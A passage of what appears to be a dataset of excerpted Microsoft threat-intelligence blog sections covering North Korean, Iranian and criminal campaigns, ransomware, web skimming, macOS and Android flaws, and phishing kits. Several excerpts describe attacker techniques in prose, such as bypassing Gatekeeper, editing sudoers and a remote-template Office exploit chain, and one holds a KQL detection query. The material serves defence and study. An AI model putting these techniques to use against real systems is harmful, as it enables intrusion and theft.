backdoor, Tickler, and leveraged Azure infrastructure hosted in fraudulent, attacker-controlled Azure subscriptions for command-and-control (C2). Microsoft continuously monitors Azure, along with all Microsoft products and services, to ensure compliance with our terms of service. Microsoft has notified affected organizations and disrupted the fraudulent Azure infrastructure and accounts associated with this activity. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence LinkedIn Threat Prevention and Defense \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. ZINC is now tracked as Diamond Sleet. \nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nIn recent months, Microsoft has detected a wide range of social engineering campaigns using weaponized legitimate open-source software by an actor we track as ZINC. Microsoft Threat Intelligence Center (MSTIC) observed activity targeting employees in organizations across multiple industries including media, defense and aerospace, and IT services in the US, UK, India, and Russia. Based on the observed tradecraft, infrastructure, tooling, and account affiliations, MSTIC attributes this campaign with high confidence to ZINC, a state-sponsored group based out of North Korea with objectives focused on espionage, data theft, financial gain, and network destruction. \nBeginning in June 2022, ZINC employed traditional social engineering tactics by initially connecting with individuals on LinkedIn to establish a level of trust with their targets. Upon successful connection, ZINC encouraged continued communication over WhatsApp, which acted as the means of delivery for their malicious payloads. \nMSTIC observed ZINC weaponizing a wide range of open-source software including PuTTY, KiTTY, TightVNC, Sumatra PDF Reader, and muPDF/Subliminal Recording software installer for these attacks. ZINC was observed attempting to move laterally and exfiltrate collected information from victim networks. The actors have successfully compromised numerous organizations since June 2022. The ongoing campaign related to the weaponized PuTTY was also reported by Mandiant earlier this month. Due to the wide use of the platforms and software that ZINC utilizes in this campaign, ZINC could pose a significant threat to individuals and organizations across multiple sectors and regions. \nMicrosoft Defender for Endpoint provides comprehensive protection against tools and custom malware used by ZINC, including ZetaNile. The hunting queries provided at the end of this blog will help customers comprehensively search their environments for relevant indicators. As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. ", "source": "microsoft"}, {"title": "Introduction", "content": "The discovery and public availability of a few Office exploits in the last six months led to these exploits gaining popularity among crimeware and targeted attackers alike. While crimeware attackers stick to payloads like ransomware and info stealers \nOffice 365 Advanced Threat Protection defense for corporate networks against recent Office exploit attacks | Microsoft Securit to attain financial gain or information theft, more sophisticated attackers clearly distinguish themselves by using advanced and multi-stage implants. \nThe Office 365 Threat Research team has been closely monitoring these attacks. The Microsoft Threat Intelligence Center (MSTIC) backs up our threat research with premium threat intelligence services that we use to correlate and track attacks and the threat actors behind them. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Office 365 Advanced Threat Protection blocks attacks that use these exploits based on the detection of malicious behaviors. Office 365 ATP helps secure mailboxes against email attack by blocking emails with unsafe attachments, malicious links, and linked-to files leveraging time-of-click protection. SecOps personnel can see ATP behavioral detections like below in Office 365's Threat Explorer page: \nCustomers using Windows Defender Advanced Threat Protection can also see multiple alerts raised based on the activities performed by the exploit on compromised machines. Windows Defender Advanced ATP is a post-breach solution that alerts SecOps personnel about hostile activity. Windows Defender ATP uses rich security data, advanced behavioral analytics, and machine learning to detect attacks. \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. \nIn addition, enterprises can block malicious documents using Windows Defender Exploit Guard, which is part of the defense-in-depth protection in Windows 10 Fall Creators Update. The Attack Surface Reduction (ASR) feature in Windows Defender Exploit Guard uses a set of built-in intelligence that can block malicious behaviors observed in malicious documents. ASR rules can also be turned on to block malicious attachments from being run or launched from Microsoft Outlook or webmail (such as Gmail, Hotmail, or Yahoo!). \nCrimeware and targeted activity groups are always on the lookout for attack vectors to infiltrate systems and networks and deploy different kinds of payloads, from commodity to advanced implants. These attack vectors include Office exploits, which we observed in multiple attack campaigns. The availability of open-source and off-the-shelf exploit builders helps drive this trend. \nAt Microsoft, we don't stop working to protect our customers' mailboxes. Our global network of expert research teams continuously monitors the threat landscape for new malware campaigns, exploits, and attack methods. Our end-toend defense suite includes Office 365 ATP, Windows Defender ATP, and Windows Defender Exploit Guard, among others, which work together to provide a holistic protection for individuals and enterprises. ", "source": "microsoft"}, {"title": "Introduction", "content": "This primary goal of web skimming campaigns is to harvest and later exfiltrate users' payment information, such as credit card details, during checkout. To achieve this, attackers typically take advantage of vulnerabilities in e-commerce platforms and CMSs to gain access to pages they want to inject the skimming script into. Another common method is web-based supply chain attacks, where attackers use vulnerabilities in installed third-party plugins and themes or compromise ad networks that may inevitably serve malicious ads without the site owner's knowledge or consent. \nAs mentioned earlier, one notable skimming campaign is Magecart. First observed in 2010, Magecart campaigns have increased in number and become stealthier through heavy obfuscation techniques, new injection points, and delivery methods. In the last five years, popular organizations or brands have been affected by Magecart-from an airline company and online ticketing services to a sports brand and personal transporter. In 2019, tens of thousands of websites got compromised because of a misconfiguration in the cloud service provider where these sites were hosted. Such an increase in these types of attacks prompted the Payment Card Industry Security Standards Council (PCI SSC) to release a bulletin that warns users about the threat. In April 2022, PCI also released a major revision in its Data Security Standard (DSS), which now includes additional requirements for ecommerce environments to help prevent skimming. ", "source": "microsoft"}, {"title": "defend", "content": "For organizations, the impact of web skimming campaigns could translate into monetary loss, reputation damage, and loss of customer trust. Web administrators and other defenders should therefore keep a close eye on such attacks. As it is, web skimming scripts closely resemble other JavaScript code used to perform legitimate business functions like web analytics. In addition, skimming scripts aren't only found in HTML files; CSS, SVG, and other file types can also embed code that runs JavaScript once the related web pages load. \nGiven the increasingly evasive tactics employed in skimming campaigns, organizations should ensure that their e-commerce platforms, CMSs, and installed plugins are up to date with the latest security patches and that they only download and use third-party plugins and services from trusted sources. They must also perform a regular and thorough check of their web assets for any compromised or suspicious content. Among the similarities we found in these recent skimming scripts include the presence of  Base64-encoded strings such as \"checkout\" and \"onepage\" and the presence of the atob() JavaScript function in compromised pages. Such clues could help defenders surface these malicious scripts. \nOrganizations should also complement best practices with a comprehensive security solution like Microsoft 365 Defender, which can detect and block skimming scripts on endpoints and servers by coordinating threat defense across various domains. It's also backed by threat experts whose continuous monitoring of the computing landscape for new attacker tools and techniques enriches our protection technologies. For example, in the case of Magecart, RiskIQ published a report that profiled the attacker groups behind it. Updates about the latest skimming campaigns observed are also provided. \nMeanwhile, online shoppers can protect themselves from web skimming attacks by ensuring their browser sessions are secure, especially during the checkout process. They should be wary of any unexpected or suspicious pop-ups that ask for payment details. Finally, users should turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus (or a similar feature in their security product). This capability utilizes artificial intelligence and machine learning to quickly identify and stop new and unknown threats. \nLearn how you can stop attacks through automated, cross-domain security with Microsoft 365 Defender. ", "source": "microsoft"}, {"title": "Introduction", "content": "The firmware was available from the vendor's website, making it easier for us to obtain a copy for examination. It is a simple .zip file containing release notes (.html) and the firmware image itself (.chk file). Running binwalk on the .chk file ended up extracting the filesystem (squash-fs). \nThe filesystem itself is a standard Linux root filesystem, with some minor additions. The relevant ones for our research are: \n1. /www \u2013 contains html pages and .gif pictures   \n2. /usr/sbin \u2013 contains various custom binaries by NETGEAR, including HTTPd, FTPC, and others \nSince we saw the anomalous communication use the standard port that HTTPd serves, we focused on HTTPd. The HTTPd itself is a 32-bit big-endian MIPS ELF, compiled against uClibc (the standard libc for embedded devices), stripped. It seems the entire server-side logic (CGI) was compiled into the HTTPd. ", "source": "microsoft"}, {"title": "Introduction", "content": "As previously covered in our previous SIP bypass blogposts (Shrootless, Migraine), SIP (also known as \"rootless\") is a macOS mechanism that enforces several operating system protections against the root user, including the ability to: \nLoad arbitrary kernel drivers   \nChange non-volatile random-access memory (NVARM) variables   \nGet task ports for Apple-signed processes   \nAllow kernel debugging Modify sensitive files that are a part of the operating system \nOne interesting fact about SIP is that bypassing just one of those restrictions is likely to lead to bypasses of all other SIP restrictions \u2013 for example: \nSIP policy is controlled by NVRAM variables, so modifying NVRAM variables bypasses SIP.   \nKernel code execution (either through kernel extensions or debugging) can change SIP since it is enforced at the kernel level. Modifying sensitive files on the file system can bypass SIP, for instance, by modifying the list of allowed kernel extensions and then loading that kernel extension. \nSIP bypasses have traditionally focused on special binaries with specific entitlements. As a reminder, entitlements are special capabilities a process might have and are a part of the digital signature of the process. Therefore, entitlements cannot be easily forged by attackers. In addition to the well-documented entitlements available for software developers, certain entitlements are reserved only for processes that have specific operating system functions, such as system updates, debugging capabilities, memory tracing, and security extensions. We refer to them as private entitlements, as their name would commonly start with a com.apple.private prefix. There are many of those special entitlements, most are not documented by Apple at all. \nOur team has identified the criticality in monitoring anomalous behavior by those specially entitled processes, as in many cases special entitlements could be used for bypassing security mechanisms. For example: ", "source": "microsoft"}, {"title": "defend", "content": "System Integrity Protection (SIP) serves as a critical safeguard against malware, attackers, and other cybersecurity threats, establishing a fundamental layer of protection for macOS systems. Bypassing SIP impacts the entire operating system's security and could lead to severe consequences, emphasizing the necessity for comprehensive security solutions that can detect anomalous behavior from specially entitled processes. The challenge of detecting such threats is compounded by the inherent limitations in kernel-level visibility on macOS, making it difficult for traditional security measures to spot and mitigate these sophisticated attacks. \nAs our research demonstrates, an attacker with the ability to run as root could have exploited CVE-2024-44243 by loading third party kernel extensions to bypass SIP. To address these challenges, Microsoft Defender Vulnerability Management quickly identifies and resolves CVE-2024-44243 and similar vulnerabilities while Microsoft Defender for Endpoint offers robust monitoring capabilities designed to detect and alert on anomalous behavior associated with specially entitled processes on macOS. Proactive monitoring for such anomalies is crucial to enable defenders to stay ahead of emerging threats and mitigate potential risks effectively. By leveraging these advanced detection mechanisms, organizations can gain greater visibility into activities that may indicate an attempt to exploit vulnerabilities that bypass SIP and other protection technologies across platforms. \nThis research underscores the importance of shared knowledge and collaborative efforts within the security community. We'd like to again thank Apple for their work in addressing this vulnerability, and Mickey Jin for responsibly disclosing the vulnerability in parallel with Microsoft. We believe that disseminating this information will not only foster responsible disclosure but also encourage collective action to fortify defenses against developing threats. By working together and leveraging the insights gained from these findings, we can better protect our systems and respond effectively to evolving security challenges. ", "source": "microsoft"}, {"title": "Introduction", "content": "iOT AND OT THREATS \nLearn more about related threats \nOne of the primary responsibilities of the Microsoft Defender for IoT research team is to ensure that the product properly analyzes various operational technology (OT) and Internet of Things (IoT) protocols. During this process, we observed a legitimate packet capture of two devices communicating using the Common Industrial Protocol (CIP), with one device sending a request containing a path to a registry value named \"ProductCode,\" and the other device responding with what appeared to be the product code value. The lack of encryption and absence of prior authentication in the communication raised concerns, as it appeared to involve a remote registry query. Further investigation revealed that the requesting device was an engineering workstation, and the responding device was an HMI \u2013 specifically, PanelView Plus. \nWe hypothesized that this remote registry querying functionality could be abused by querying system keys to access secrets or even gain remote control. To validate this hypothesis, we needed to locate the code responsible for this functionality. Since the two devices communicated using the CIP, our first step was to understand the protocol in depth. ", "source": "microsoft"}, {"title": "Introduction", "content": "As mentioned earlier, BlackCat is one of the first ransomware written in the Rust programming language. Its use of a modern language exemplifies a recent trend where threat actors switch to languages like Rust or Go for their payloads in their attempt to not only avoid detection by conventional security solutions but also to challenge defenders who may be trying to reverse engineer the said payloads or compare them to similar threats. \nBlackCat can target and encrypt Windows and Linux devices and VMWare instances. It has extensive capabilities, including self-propagation configurable by an affiliate for their usage and to environment encountered. \nIn the instances we've observed where the BlackCat payload did not have administrator privileges, the payload was launched via dllhost.exe, which then launched the following commands below (Table 1) via cmd.exe. These commands could vary, as the BlackCat payload allows affiliates to customize execution to the environment. \nThe flags used by the attackers and the options available were the following: -s -d - f -c; \u2013access-token; \u2013propagated; -no-prop-servers ", "source": "microsoft"}, {"title": "defend", "content": "Today's ransomware attacks have become more impactful because of their growing industrialization through the RaaS affiliate model and the increasing trend of double extortion. The incidents we've observed related to the BlackCat ransomware leverage these two factors, making this threat durable against conventional security and defense approaches that only focus on detecting the ransomware payloads. Detecting threats like BlackCat, while good, is no longer enough as humanoperated ransomware continues to grow, evolve, and adapt to the networks they're deployed or the attackers they work for. \nInstead, organizations must shift their defensive strategies to prevent the end-toend attack chain. As noted above, while attackers' entry points may vary, their TTPs remain largely the same. In addition, these types of attacks continue to take advantage of an organization's poor credential hygiene and legacy configurations or misconfigurations to succeed. Therefore, defenders should address these common paths and weaknesses by hardening their networks through various best practices such as access monitoring and proper patch management. We provide detailed steps on building these defensive strategies against ransomware in this blog. \nIn the BlackCat-related incidents we've observed, the common entry points for ransomware affiliates were via compromised credentials to access internet-facing remote access software and unpatched Exchange servers. Therefore, defenders should review their organization's identity posture, carefully monitor external access, and locate vulnerable Exchange servers in their environment to update as soon as possible. The financial impact, reputation damage, and other repercussions that stem from attacks involving ransomware like BlackCat are not worth forgoing downtime, service interruption, and other pain points related to applying security updates and implementing best practices. ", "source": "microsoft"}, {"title": "Defense", "content": "Microsoft 365 Defender helps protect organizations from attacks that deliver the BlackCat ransomware and other similar threats by providing cross-domain visibility and coordinated threat defense. It uses multiple layers of dynamic protection technologies and correlates threat data from email, endpoints, identities, and cloud apps. Microsoft Defender for Endpoint detects tools like Mimikatz, the actual BlackCat payload, and subsequent attacker behavior. Threat and vulnerability management capabilities also help discover vulnerable or misconfigured devices across different platforms; such capabilities could help detect and block possible exploitation attempts on vulnerable devices, such as those running Exchange. Finally, advanced hunting lets defenders create custom detections to proactively surface this ransomware and other related threats. ", "source": "microsoft"}, {"title": "Introduction", "content": "On February 28, 2022, a Twitter account named $@$ ContiLeaks (allegedly a Ukrainian researcher) began posting leaked Conti data on Twitter. The leaked data sets, which were posted in a span of several months, consisted of chat logs, source codes, and backend applications. \nFor this research, we focused our analysis on the chat logs, which revealed crucial information about the Conti group's operating methods, infrastructure, and organizational structure. ", "source": "microsoft"}, {"title": "Conclusion", "content": "This blog outlines how Python can be used to find valuable threat intelligence from data sets such as chat logs. It also presents details on how processing data using the MSTICPy library can be useful for enriching and hunting within environments, as well as collecting additional threat context. The interactive notebook provides additional code snippets that can also be used to continue log exploration. \nThe types of information extracted in this blog provides insights into the various elements of the criminal ecosystem that were coordinating their activities. Threat intelligence from research like this informs products and services like Microsoft 365 Defender, translating knowledge into real-world protection for customers. More importantly, the methodology described in this blog can be adapted to specific threat intelligence services, and the broader community is invited to use it for further analysis, enrichment of data, and intelligence sharing for the benefit of all. ", "source": "microsoft"}, {"title": "Introduction", "content": "Since at least early December 2024, multiple hosts downloaded first-stage payloads from malicious GitHub repositories. The users were redirected to GitHub through a series of other redirections. Analysis of the redirector chain determined the attack likely originated from illegal streaming websites where users can watch pirated videos. The streaming websites embedded malvertising redirectors within movie frames to generate pay-per-view or pay-per-click revenue from malvertising platforms. These redirectors subsequently routed traffic through one or two additional malicious redirectors, ultimately leading to another website, such as a malware or tech support scam website, which then redirected to GitHub. \nMultiple stages of malware were deployed in this campaign, as listed below, and the several different stages of activity that occurred depended on the payload dropped during the second stage. \nThe first-stage payload that was hosted on GitHub served as the dropper for the next stage of payloads.   \nThe second-stage files were used to conduct system discovery and to exfiltrate system information that was Base64-encoded into the URL and sent over HTTP to an IP address. The information collected included data on memory size, graphic details, screen resolution, operating system (OS), and user paths.   \nVarious third-stage payloads were deployed depending on the second-stage payload. In general, the third-stage payload conducted additional malicious activities such as command and control (C2) to download additional files and to exfiltrate data, as well as defense evasion techniques. \nThe full redirect chain was composed of four to five layers. Microsoft researchers determined malvertising redirectors were contained within an iframe on illegal streaming websites. \nThere were several redirections that occurred before arriving at the malicious content stored on GitHub. ", "source": "microsoft"}, {"title": "Strengthen Microsoft Defender", "content": "Ensure that tamper protection is enabled in Microsoft Defender for Endpoint.   \nEnable network protection in Microsoft Defender for Endpoint.   \nTurn on web protection.   \nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your nonMicrosoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach. \nConfigure\u202finvestigation and remediation\u202fin full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume. \nMicrosoft Defender XDR customers can turn on the following attack surface reduction rules to prevent common attack techniques used by threat actors. \nBlock executable files from running unless they meet a prevalence, age or trusted list criterion Block execution of potentially obfuscated scripts Block JavaScript or VBScript from launching downloaded executable content Block process creations originating from PSExec and WMI commands Block credential stealing from the Windows local security authority subsystem O Block use of copied or impersonated system tools ", "source": "microsoft"}, {"title": "Introduction", "content": "The Android operating system enforces isolation by assigning each application its own dedicated data and memory space. To facilitate data and file sharing, Android provides a component called a content provider, which acts as an interface for managing and exposing data to the rest of the installed applications in a secure manner. When used correctly, a content provider provides a reliable solution. However, improper implementation can introduce vulnerabilities that could enable bypassing of read/write restrictions within an application's home directory. \nThe Android software development kit (SDK) includes the FileProvider class, a subclass of ContentProvider that enables file sharing between installed applications. An application that needs to share its files with other applications can declare a FileProvider in its app manifest and declare the specific paths to share. \nEvery file provider has a property called authority, which identifies it system-wide, and can be used by the consumer (the app that wants to access the shared files) as a form of address. This content-based model bears a strong resemblance to the web model, but instead of the http scheme, consumers utilize the content scheme along with the authority, followed by a pseudo-path to the file that they want to access. \nFor example, assuming that the application com.example.server shares some files under the file:///data/data/com.example.server/files/images directory that it has previously declared as shared using the name shared_images, a consumer can use the content://[authority]/shared_images/[sub-path]/[filename] URI to index these files. \nAccess is given by the data sharing application most commonly using the grantUriPermissions attribute of the Android manifest, in combination with special flags that are used to define a read or write mode of operation. The data sharing application creates and sends an intent to the consumer that provides temporary fine-grained access to a file.  Finally, when a provider receives a file access request, it resolves the actual file path that corresponds to the incoming URI and returns a file descriptor to it. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \n\ue80f Blog home / Threat intelligence Products\ue70d All Microsoft\ue70d \nSearch the blog \nThreat intelligence Threat actors \n12 min read \nCyber Signals Issue 8 | Education under siege: How cybercriminals target our schools \nBy Microsoft Threat Intelligence ", "source": "microsoft"}, {"title": "Introduction", "content": "UpdateAgent is uniquely characterized by its gradual upgrading of persistence techniques, a key feature that indicates this trojan will likely continue to use more sophisticated techniques in future campaigns. Like many information-stealers found on other platforms, the malware attempts to infiltrate macOS machines to steal data and it is associated with other types of malicious payloads, increasing the chances of multiple infections on a device. \nThe trojan is likely distributed via drive-by downloads or advertisement pop-ups, which impersonate legitimate software such as video applications and support agents. This action of impersonating or bundling itself with legitimate software increases the likelihood that users are tricked into installing the malware. Once installed, UpdateAgent starts to collect system information that is then sent to its command-and-control (C2) server. \nNotably, the malware's developer has periodically updated the trojan over the last year to improve upon its initial functions and add new capabilities to the trojan's toolbox. The timeline below illustrates a series of techniques adopted by UpdateAgent from September 2020 through October 2021: \nSeptember\u2013December 2020: The initial version of UpdateAgent was considered to be a fairly basic information-stealer. At the time, the malware was only capable of performing reconnaissance to scan and collect system information such as product names and versions. Once gathered, the data was then sent as heartbeats to the malware's C2 server. \nJanuary\u2013February 2021: Approximately two months later, UpdateAgent maintained its original capabilities and added a new one: the ability to fetch secondary payloads as .dmg files from public cloud infrastructure. DMG files are mountable disk images used to distribute software and apps to macOS, allowing the trojan to easily install additional programs on affected devices. \nMarch 2021: Upon its third update, the malware altered one of its prior functions to fetch secondary payloads as .zip files instead of .dmg files. The malware's developer also included two new capabilities: the ability to bypass Gatekeeper by removing the downloaded file's quarantine attribute and the ability to create a PLIST file that is added to the LaunchAgent folder. The quarantine attribute forces Gatekeeper to block the launch of any file downloaded from the web or other unknown sources, and it also displays a pop-up warning that users cannot open the respective file as \"it is from an unidentified developer\". By removing the attribute, the malware both prevented the pop-up message warning users and allowed the files to launch without being blocked by Gatekeeper. Moreover, as the LaunchAgent folder specifies which apps and code automatically run each time a user signs into the machine, adding the malware's PLIST file allowed it to be included in these automatic launches for persistence upon users signing into the affected device. \nAugust 2021: The malware's fourth update further altered some of its prior capabilities. For one, it expanded its reconnaissance function to scan and collect System_profile and SPHardwaretype information. Additionally, UpdateAgent was changed to create and add PLIST files to the LaunchDaemon folder instead of the LaunchAgent folder. While targeting the LaunchDaemon folder instead of the LaunchAgent folder required administrative privileges, it permitted the malware to inject persistent code that ran as root. This code generally takes the form of background processes that don't interact with users, thus it also improved the trojan's evasiveness. \nOctober 2021: We detected the latest variants of UpdateAgent just over a year since its release into the wild. Sporting many of the updates found in the August 2021 variant, UpdateAgent still performed system reconnaissance, communicated with the C2 server as heartbeats, and bypassed Gatekeeper. Additionally, the October update expanded the malware's ability to fetch secondary payloads as both .dmg or .zip files from public cloud infrastructure, rather than choosing between filetypes. Among its new capabilities, UpdateAgent included the ability to enumerate LSQuarantineDataURLString using SQLite in order to validate whether the malware's downloaded app is within the Quarantine Events database where it would be assigned a quarantine attribute. The upgrade also allowed the malware to leverage existing user profiles to run commands requiring sudo access in addition to the ability to add arguments using PlistBuddy to create and edit PLIST files more easily. Lastly, the trojan included the ability to modify sudoers list, allowing the malware to bypass a prompt requiring high privilege user credentials while running UpdateAgent's downloaded app. ", "source": "microsoft"}, {"title": "defend", "content": "UpdateAgent's evolution displays the increasing complexity of threats across platforms. Its developers steadily improved the trojan over the last year, turning a basic information-stealer into a persistent and more sophisticated piece of malware. This threat also exemplifies the trend of common malware increasingly harboring more dangerous threats, a pattern also observed in other platforms. UpdateAgent's ability to gain access to a device can theoretically be leveraged by attackers to introduce potentially more dangerous payloads, emphasizing the need to identify and block threats such as this. \nDefenders can take the following mitigation steps to defend against this threat: \nEncourage the use of Microsoft Edge-available on macOS and various platforms-or other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Restrict access to privileged resources, such as LaunchDaemons or LaunchAgents folders and sudoers files, through OSX enterprise management solutions. This helps to mitigate common persistence and privilege escalation techniques. Install apps from trusted sources only, such as a software platform's official app store. Third-party sources may have lax standards for the applications that they host, allowing malicious actors to upload and distribute malware. Run the latest version of your operating systems and applications. Deploy the latest security updates as soon as they become available. \nAs organizational environments are intricate and heterogenous, running multiple applications, clouds, and devices, they require solutions that can protect across platforms. Microsoft Defender for Endpoint offers cross-platform security and a unified investigation experience that gives customers visibility across all endpoints and enables them to detect, manage, respond, and remediate threats, such as the capability to detect UpdateAgent's anomalous use of PlistBuddy. \nMicrosoft Defender for Endpoint customers can apply the following mitigations to reduce the environmental attack surface and mitigate the impact of this threat and its payloads: \nTurn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.   \nEnable potentially unwanted application (PUA) protection in block mode to automatically quarantine PUAs like adware. PUA blocking takes effect on endpoint clients after the next signature update or computer restart. PUA blocking takes effect on endpoint clients after the next signature update or computer restart.   \nTurn on network protection to block connections to malicious domains and IP addresses. \nDefender for Endpoint's next-generation protection reinforces network security perimeters and includes antimalware capabilities to catch emerging threats, including UpdateAgent and its secondary payloads, C2 communications, and other malicious artifacts affiliated with the trojan's reconnaissance activities. Moreover, macOS antimalware detections provide insight into where a threat originated and how the malicious process or activity was created, providing security teams a comprehensive view of incidents and attack chains. \nFinally, this research underscores the importance of understanding a macOS threat's progression to not only remedy its current abilities, but to prepare for increased capabilities and sophistication of the threat. As threats on other OS platforms continue to grow, our security solutions must secure users' computing experiences be it a Windows or non-Windows machine. By sharing our research and other forms of threat intelligence, collaboration across the larger security community can aid in enriching our protection technologies, regardless of the platform or device in use. ", "source": "microsoft"}, {"title": "Introduction", "content": "The initial campaigns in August 2021 likely originated from emails impersonating contracts and legal agreements, where the documents themselves were hosted on file-sharing sites. The exploit document used an external oleObject relationship to embed exploitative JavaScript within MIME HTML remotely hosted content that results in (1) the download of a CAB file containing a DLL bearing an INF file extension, (2) decompression of that CAB file, and (3) execution of a function within that DLL. The DLL retrieves remotely hosted shellcode (in this instance, a custom Cobalt Strike Beacon loader) and loads it into wabmig.exe (Microsoft address import tool.) \nContent that is downloaded from an external source is tagged by the Windows operating system with a mark of the web, indicating it was downloaded from a potentially untrusted source. This invokes Protected Mode in Microsoft Office, requiring user interaction to disable it to run content such as macros. However, in this instance, when opened without a mark of the web present, the document's payload executed immediately without user interaction \u2013 indicating the abuse of a vulnerability. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender for Office 365 detects exploit documents delivered via email when detonation is enabled using the following detection names: \nTrojan_DOCX_OLEAnomaly_A Description $=$ \"The sample is an Office document which contains a suspicious oleobject definition.\"   \nTrojan_DOCX_OLEAnomaly_AB Description $=$ \"The sample is an Office document which exhibits malicious template injection qualities.\"   \nExploit_Office_OleObject_A Description $=$ \"This sample is an Office document which exhibits malicious qualities.\"   \nExploit_Office_OleObject_B Description $=$ \"This sample is an Office document which exhibits malicious qualities.\" \nThe following alerts in your portal indicate that a malicious attachment has been blocked, although these alerts are also used for many different threats: \nMalware campaign detected and blocked Malware campaign detected after delivery Email messages containing malicious file removed after delivery ", "source": "microsoft"}, {"title": "defend", "content": "Use the following query to surface abuse of Control Panel objects (.cpl) via URL protocol handler path traversal as used in the original attack and public proof of concepts at time of publishing: \nDeviceProcessEvents   \n| where (FileName in\\~('control.exe','rundll32.exe') and ProcessCommandLine   \nhas '.cpl:')   \nor ProcessCommandLine matches regex @'\\\"\\.[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.' ", "source": "microsoft"}, {"title": "Introduction", "content": "A \"phishing kit\" or \"phish kit\" can refer to various parts of a set of software or services meant to facilitate phishing. The term refers most commonly to an archive file containing images, scripts, and HTML pages that enable an attacker to quickly set up an undetectable phishing page and collect credentials through it. However, \"phishing kit\" can also be used to refer specifically to the unique page itself that spoofs a brand and interacts with a user, collects the user's credentials, and posts them to an asset the attacker owns. \nPhishing kits are generally split into the following major components based on function: \nImitation: These components help make the login pages appear legitimate. These can include imagery to imitate welcome banners, as well as dynamically generated logos and branding that are fetched based on the target's email address. These components may also include legitimate links and \"help\" or \"password reset\" buttons that navigate cautious users out of the page and onto legitimate sites.   \nObfuscation: These components hide the pages' true purpose from scanners or automated security detection systems. Obfuscation techniques can be through encoding or individual functions designed to make the extraction of resources more difficult. Obfuscation can also include anti-sandboxing resources on the page or on the site that are called to enforce geofencing, CAPTCHAs, and others.   \nCredential harvest: These components facilitate the entry, collection, and exfiltration of the credentials the target user provides. These components also include information about where said credentials are sent, how they are stored, and which sites the user is sent to after giving their credentials. \nThese components are seen in the TodayZoo phishing kit, which we will discuss in the following sections. ", "source": "microsoft"}, {"title": "defend", "content": "Our analysis of TodayZoo, DanceVida, and other phishing kits gives us several insights into the underground economy today. First, this research further proves that most phishing kits observed or available today are based on a smaller cluster of larger kit \"families.\" While this trend has been observed previously, it continues to be the norm, given how phishing kits we've seen share large amounts of code among themselves. The continued presence of dead links and callbacks to other kits indicates that many phishing kit distributors and phishing operators have easy access to these existing kits and use parts of them to make new ones faster. \nSecondly, our research shows that the players in the cybercrime economy count on a lack of examination into their products. Whether that is a bane or a boon on their part depends on how the products' codes are implemented. For example, an unchecked reused kit that still calls back to its original creator with copies of stolen credentials potentially translates into an equivalent of a passive income for the said creator. \nInsights such as those presented above enrich our protection technologies. Our intelligence on unique phishing kits such as TodayZoo, phishing services, and other components of phishing attacks allows Microsoft Defender for Office 365 to detect related campaigns and block malicious emails, URLs, and landing pages. Combined with Defender for Office 365's use of machine learning, heuristics, and advanced detonation technology, such intel also makes it possible to detect kits that attempt to leverage techniques from one or multiple codes, even before a user receives the email or interacts with the content. \nThreat intelligence about the latest trends in the phishing landscape also feeds into other Microsoft security solutions, such as Microsoft Defender SmartScreen, which blocks phishing websites and malicious URLs and domains in the browser, and Network protection, which blocks connections to malicious domains and IP addresses. Advanced hunting capabilities allow analysts to search for phishing kit components and other IOAs. \nOrganizations can configure the recommended settings in Microsoft Defender for Office 365, such as applying anti-phishing, Safe Links, and Safe Attachments policies. These ensure real-time protection by scanning at the time of delivery and at the time of click. They can further strengthen their protection with Microsoft 365 Defender, which correlates signals from emails, endpoints, and other domains, delivering coordinated defense. \nLearn how you can stop credential phishing and other email threats through comprehensive, industry-leading protection with Microsoft Defender for Office 365. \nVisit our National Cybersecurity Awareness Month page for more resources and information on protecting your organization year-round. Do your part. #BeCyberSmart \nMicrosoft 365 Defender Threat Intelligence Team ", "source": "microsoft"}, {"title": "Introduction", "content": "The actors behind DEV-0537 focused their social engineering efforts to gather knowledge about their target's business operations. Such information includes intimate knowledge about employees, team structures, help desks, crisis response workflows, and supply chain relationships. Examples of these social engineering tactics include spamming a target user with multifactor authentication (MFA) prompts and calling the organization's help desk to reset a target's credentials. \nMicrosoft Threat Intelligence Center (MSTIC) assesses that the objective of DEV0537 is to gain elevated access through stolen credentials that enable data theft and destructive attacks against a targeted organization, often resulting in extortion. Tactics and objectives indicate this is a cybercriminal actor motivated by theft and destruction. \nWhile this actor's TTPs and infrastructure are constantly changing and evolving, the following sections provide additional details on the very diverse set of TTPs we have observed that DEV-0537 is using. ", "source": "microsoft"}, {"title": "Introduction", "content": "Mint Sandstorm is Microsoft's new name for PHOSPHORUS, an Iranian nation-state actor. This new name is part of the new threat actor naming taxonomy we announced today, designed to keep pace with the evolving and growing threat landscape. \nMint Sandstorm is known to pursue targets in both the private and public sectors, including political dissidents, activist leaders, the Defense Industrial Base (DIB), journalists, and employees from multiple government agencies, including individuals protesting oppressive regimes in the Middle East.  Activity Microsoft tracks as part of the larger Mint Sandstorm group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453. \nMint Sandstorm is a composite name used to describe several subgroups of activity with ties to the same organizational structure. Microsoft assesses that Mint Sandstorm is associated with an intelligence arm of Iran's military, the Islamic Revolutionary Guard Corps (IRGC), an assessment that has been corroborated by multiple credible sources including Mandiant, Proofpoint, and SecureWorks.  In 2022, the US Department of Treasury sanctioned elements of Mint Sandstorm for past cyberattacks citing sponsorship from the IRGC. \nToday, Microsoft is reporting on a distinct Mint Sandstorm 